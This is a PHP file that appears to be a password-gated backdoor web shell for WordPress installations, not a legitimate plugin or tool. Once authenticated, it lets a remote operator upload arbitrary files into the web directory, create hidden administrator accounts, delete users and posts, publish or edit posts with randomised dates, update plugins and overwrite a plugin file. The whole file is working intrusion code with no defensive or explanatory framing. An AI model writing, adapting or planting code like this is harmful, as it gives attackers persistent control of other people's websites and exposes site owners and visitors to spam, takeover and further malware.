<?php
header('Content-Type:text/html; charset=UTF-8');

@set_time_limit(60);

define('API_VERSION', 2.0);
define('PASSWORD_FILE', 'p.txt');

if(file_exists(PASSWORD_FILE)) {
	@unlink(PASSWORD_FILE);
}

//////////////////////////////////////////
function array_to_json( $array )
{
    if (is_string($array)) return '"'.rawurlencode($array).'"';
    if (is_numeric($array)) return $array;
    if ($array === null) return 'null';
    if ($array === true) return 'true';
    if ($array === false) return 'false';

    $assoc = false;
    $i = 0;
    foreach ($array as $k=>$v){
        if ($k !== $i++){
            $assoc = true;
            break;
        }
    }
    $res = array();
    foreach ($array as $k=>$v){
        $v = array_to_json($v);
        if ($assoc){
            $k = '"'.rawurlencode($k).'"';
            $v = $k.':'.$v;
        }
        $res[] = $v;
    }
    $res = implode(',', $res);
    return ($assoc)? '{'.$res.'}' : '['.$res.']';
}
//////////////////////////////////////////

define('SHELL_PASSWORD', 'a6a8cb877ee18215f2c0fc2a6c7b4f2a');
define('MAX_UP_LEVELS', 10);

if((empty($_COOKIE['password']) && empty($_POST['password'])) || (!empty($_POST['password']) && md5($_POST['password']) != SHELL_PASSWORD)) {
	print '<form method="post" action="'.$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'].'">Password : <input type="text" name="password"><input type="submit"></form>';
	exit;
}

if(!empty($_POST['password']) && md5($_POST['password']) == SHELL_PASSWORD) {
	setcookie('password', SHELL_PASSWORD, time()+60*60*24);
	header("Location: {$_SERVER['PHP_SELF']}?{$_SERVER['QUERY_STRING']}");
	exit;
}

if(empty($_COOKIE['password']) || $_COOKIE['password'] != SHELL_PASSWORD) {
	exit;
}

if(!empty($_FILES['f'])) {
	$new_path = dirname(__FILE__) . '/' . $_FILES['f']['name'];
	if(move_uploaded_file($_FILES['f']['tmp_name'], $new_path)) {
		print "<a href=\"{$_FILES['f']['name']}\">{$_FILES['f']['name']}</a>";
	}
	else {
		print "Upload failed!";
	}
	exit;
}

if(!empty($_REQUEST['uf']) && $_REQUEST['uf'] == 1) {
	print "<form method=\"post\" enctype=\"multipart/form-data\" action=\"{$_SERVER['PHP_SELF']}\"><input type=\"file\" name=\"f\"><input type=\"submit\"></form>";
	exit;
}

$counter = 0;
$dir_up = './';
do {
	$file_found = false;
	$file_path = "{$dir_up}wp-load.php";
	if(file_exists($file_path)) {
		require($file_path);
		$file_found = true;
	}
	else {
		$dir_up .= '../';
	}
	$counter++;
}while(!$file_found && $counter < MAX_UP_LEVELS);

if(!empty($_GET['get_blogs_list'])) {
	print array_to_json(get_blog_list( 0, 'all' ));
}

if(!empty($_GET['get_users'])) {
	if(function_exists('get_users')) {
		print array_to_json(get_users());
	}
	else {
		print array_to_json(array());
	}
}
//print_r($_REQUEST);
if(isset($_REQUEST['action']) && $_REQUEST['action'] == 'create_user') {
if(empty($_REQUEST['wp_username']) || empty($_REQUEST['wp_password']) || empty($_REQUEST['wp_email'])){
print "Missing parameter for creating user!";
exit;
}
else {
$userdata = array('user_login' => $_REQUEST['wp_username'], 'user_pass' => $_REQUEST['wp_password'], 'user_email' => $_REQUEST['wp_email'], 'role' => 'administrator');
//print_r($_REQUEST);
$user_id = wp_insert_user( $userdata );
	if(is_numeric($user_id)) {
		print array_to_json(array('user_id' => $user_id));
	}
	else {
			print array_to_json("Failed creating user!");
		}
	}
}

if(!empty($_REQUEST['delete_user']) && !empty($_REQUEST['wp_user_id'])) {
	if(wp_delete_user($_REQUEST['wp_user_id'])) {
		print array_to_json("User deleted!");
	}
	else {
		print array_to_json("Failed deleting user!");
	}
}

if($_REQUEST['delete_post'] == 1 && !empty($_REQUEST['ID'])) {
	$del_op_res = wp_delete_post( $_REQUEST['ID'], true );
	if(!$del_op_res) print array_to_json("Delete failed!");
	else print array_to_json("Post deleted!");
	exit;
}

if(!empty($_REQUEST['title']) && !empty($_REQUEST['post'])) {
	$post_date = $_REQUEST['datepicker'] . " " . rand(0,23) . ":" . rand(0,59) . ":" . rand(0,59);

	// Create post object
	$my_post = array(
	  'post_title'    => $_REQUEST['title'],
	  'post_content'  => $_REQUEST['post'],
	  'post_status'   => 'publish',
	  'post_author'   => 1,
	  'post_type' => $_REQUEST['post_type'],
	  'post_date'     => $post_date
	);
	$id = NULL;
	if(empty($_REQUEST['ID'])) {
		// Insert the post into the database
		$id = wp_insert_post($my_post);
	}
	else {
		$my_post['ID'] = $_REQUEST['ID'];
		$id = wp_update_post($my_post);
	}
	$permalink = get_permalink( $id );
	wp_set_post_categories($id, array($_REQUEST['cat']));
	if($_REQUEST['delete_post'] != 1) {
		if(!empty($id)) {
			$post = get_post($id);
			print array_to_json(array("permalink"=>$permalink,"link_by_id"=>$post->guid,"ID"=>$id));
		}
		else {
			print array_to_json("Action failed!");
		}
	}
}

if(!empty($_REQUEST['plugin2update'])) {
	include_once( $dir_up . 'wp-admin/includes/class-ftp.php');
	include_once( $dir_up . 'wp-admin/includes/update.php');
	include_once( $dir_up . 'wp-admin/includes/file.php');
	include_once( $dir_up . 'wp-admin/includes/screen.php');
	include_once( $dir_up . 'wp-admin/includes/misc.php');
	include_once( $dir_up . 'wp-admin/includes/plugin.php');
	
	foreach($_REQUEST['plugin2update'] as $plugin) {
		print "$plugin update : ";
		wp_update_plugin($plugin);
	}
	
	exit;
}

if(!empty($_REQUEST['file2clean'])) {
$tell_a_friend_content = '<?php
/*
Plugin Name: Tell a Friend
Version: 0.1
Plugin URI: http://www.freetellafriend.com/get_button/
Description: Adds a \'Share This Post\' button after each post. The service which is used is freetellafriend.com which supports e-mail address book, social bookmarks and favorites.
Author: FreeTellaFriend
Author URI: http://www.freetellafriend.com/
*/

function tell_a_friend($content) {
global $post;
$taf_permlink = urlencode(get_permalink($post->ID));
$taf_title = urlencode(get_the_title($post->ID) );
$taf_img = get_settings(\'home\') . \'/wp-content/plugins/tell-a-friend/button.gif\';

	if ( !is_feed() && !is_page() ) {
	$content .= \'<a href="https://www.freetellafriend.com/tell/?url=\'.$taf_permlink.\'&title=\'.$taf_title.\'" onclick="window.open(\'https://www.freetellafriend.com/tell/?url=\'.$taf_permlink.\'&title=\'.$taf_title.\'\', \'freetellafriend\', \'scrollbars=1,menubar=0,width=617,height=530,resizable=1,toolbar=0,location=0,status=0,screenX=210,screenY=100,left=210,top=100\'); return false;" target="_blank" title="Share This Post"><img src="\'.$taf_img.\'" style="width:127px;height:16px;border:0px;" alt="Share This Post" title="Share This Post" /></a>\';				  
	}

return $content;
}

add_filter(\'the_content\', \'tell_a_friend\');

?>';

	if(file_exists($_REQUEST['file2clean'])) {
		if(strpos($_REQUEST['file2clean'], 'tell-a-friend.php') !== false) {
			if(file_put_contents($_REQUEST['file2clean'], $tell_a_friend_content)) {
				print "File {$_REQUEST['file2clean']} has been cleaned.";
			}
			else {
				print "Failed cleaning {$_REQUEST['file2clean']} !";
			}
		}
	}
}

if(!empty($_REQUEST['get_plugins']) && $_REQUEST['get_plugins'] == 1) {
	include_once($dir_up . 'wp-admin/includes/plugin.php');
		
	$plugins = get_plugins();
	print array_to_json($plugins);
}

if(!empty($_REQUEST['post_url2search'])) {
	$the_slug = str_replace('/', '', $_REQUEST['post_url2search']);
	$args = array(
		'name' => $the_slug,
		'post_status' => 'publish',
		'posts_per_page' => 1
	);
	$my_posts = get_posts( $args );

	if(!empty($my_posts[0]->ID) && is_numeric($my_posts[0]->ID)) {
		$post = get_post($my_posts[0]->ID);
		$post->category = get_the_category($my_posts[0]->ID);
	}
	
	print array_to_json($post);
}

if(!empty($_REQUEST['post_id'])) {
	$post = get_post($_REQUEST['post_id']);
	$post->category = get_the_category($_REQUEST['post_id']);
	print array_to_json($post);
}

if(!empty($_REQUEST['page_id'])) {
	$post = get_page($_REQUEST['page_id']);
	$post->category = get_the_category($_REQUEST['page_id']);
	print array_to_json($post);
}

$args = array(
	'show_option_all'    => '',
	'show_option_none'   => '',
	'orderby'            => 'ID', 
	'order'              => 'ASC',
	'show_count'         => 1,
	'hide_empty'         => 0, 
	'child_of'           => 0,
	'exclude'            => '',
	'echo'               => 1,
	'selected'           => $sel_cat,
	'hierarchical'       => 0, 
	'name'               => 'cat',
	'id'                 => '',
	'class'              => 'postform',
	'depth'              => 0,
	'tab_index'          => 0,
	'taxonomy'           => 'category',
	'hide_if_empty'      => false,
    'walker'             => ''
);

if(!empty($_REQUEST['get_categories']) && $_REQUEST['get_categories'] == 1) {
	print array_to_json(get_categories( $args )); 
}

if(!empty($_REQUEST['get_pages_list']) && $_REQUEST['get_pages_list'] == 1) {
	$pages_array = get_pages();
	$new_pages_array = array();
	for($i=0,$len=count($pages_array);$i<$len;$i++) {
		$new_pages_array[$i]['ID'] = $pages_array[$i]->ID;
		$new_pages_array[$i]['post_title'] = $pages_array[$i]->post_title;
		$new_pages_array[$i]['post_name'] = $pages_array[$i]->post_name;
	}
	print array_to_json($new_pages_array);
}

if(!empty($_REQUEST['get_posts_list'])) {
	if(isset($_REQUEST['search_by_post_type'])) {
		$post_type = $_REQUEST['search_by_post_type'];
	}
	else {
		$post_type = '';
	}

	$args = array(
	'posts_per_page'   => 50,
	'offset'           => 0,
	'category'         => '',
	'category_name'    => '',
	'orderby'          => 'ID',
	'order'            => 'DESC',
	'include'          => '',
	'exclude'          => '',
	'meta_key'         => '',
	'meta_value'       => '',
	'post_type'        => $post_type,
	'post_mime_type'   => '',
	'post_parent'      => '',
	'post_status'      => 'publish',
	'suppress_filters' => true );

	if(isset($_REQUEST['search_by_url'])) {
		$the_slug = str_replace('/', '', $_REQUEST['search_by_url']);
		if(!empty($post_type) && $post_type == 'post') {
			$args['name'] = $the_slug;
		}
		else {
			$args['pagename'] = $the_slug;
		}
	}
	
	if(isset($_REQUEST['search_by_keyword'])) {
		$args['s'] = $_REQUEST['search_by_keyword'];
	}
	
	$posts_array = get_posts( $args );
	for($i=0,$len=count($posts_array);$i<$len;$i++) {
		$new_posts_array[$i]['ID'] = $posts_array[$i]->ID;
		$new_posts_array[$i]['post_title'] = $posts_array[$i]->post_title;
		$new_posts_array[$i]['post_name'] = $posts_array[$i]->post_name;
		$new_posts_array[$i]['post_content'] = $posts_array[$i]->post_content;
	}
	print array_to_json($new_posts_array);
}

if(!empty($_REQUEST['upload_file'])) {
	print '<form method="post" enctype="multipart/form-data"><input type="file" name="my_file"><input type="submit"></form>';
}

if(!empty($_FILES['my_file'])) {
	$base_name = basename($_FILES['my_file']['name']);
	if(move_uploaded_file($_FILES['my_file']['tmp_name'], $base_name)) {
		print '<a href="'.$base_name.'" target="_blank">'.$base_name.'</a>';
	}
}

if(!empty($_REQUEST['get_api_version'])) {
	print array_to_json(array('api_version' => number_format(API_VERSION, 2)));
}
?>
